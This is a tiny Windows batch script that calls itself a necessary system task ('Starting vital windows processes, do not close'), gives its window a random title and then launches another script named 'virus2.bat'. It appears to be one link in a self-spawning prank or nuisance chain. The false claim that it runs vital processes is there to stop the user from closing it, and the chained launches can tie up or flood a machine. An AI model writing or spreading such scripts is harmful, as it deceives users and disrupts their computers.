@echo off
color 0a
echo Starting vital windows processes, do not close
Pushd "%~dp0"
:a
title Win%Random%a
timeout /t 2 /nobreak >nul
start virus2.bat